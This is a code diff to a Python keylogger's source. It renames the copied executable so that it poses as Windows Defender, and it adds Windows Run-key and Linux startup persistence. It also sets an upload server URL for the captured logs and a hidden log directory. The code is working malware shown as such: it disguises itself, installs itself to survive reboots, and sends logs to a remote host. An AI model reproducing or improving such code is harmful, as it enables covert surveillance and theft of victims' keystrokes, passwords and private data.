@@ -13,10 +13,10 @@ def setup_persistence():        #This function sets up persistence (runs automat
 
     os_type = platform.system()
     if os_type == "Windows":
-        location = os.environ['appdata'] + "\\MicrosoftEdgeLauncher.exe" # Disguise the keylogger as Microsoft Edge
+        location = os.environ['appdata'] + "\\Defender.exe" # Disguise the keylogger as Defender
         if not os.path.exists(location):
             shutil.copyfile(executable, location)
-            subprocess.call(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MicrosoftEdge /t REG_SZ /d "{location}" ', shell=True)
+            subprocess.call(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Defender /t REG_SZ /d "{location}" ', shell=True)
     elif os_type == "Linux":
         location = os.path.expanduser('~') + "/.config/KaliStartup"
         if not os.path.exists(location):
@@ -36,7 +36,9 @@ setup_persistence()
 SERVER_URL = 'https://yourserver.com/upload'  # Replace with your server URL
 
 # Define the hidden directory for logs
-LOG_DIR = 'hidden_logs'
+# Path to the database file
+BASE_DIR = os.path.dirname(__file__)
+LOG_DIR = os.path.join(BASE_DIR, 'hidden_logs')
 UPLOADED_FILES_LOG = os.path.join(LOG_DIR, 'uploaded_files.log')
 
 # Function to get the current PC username
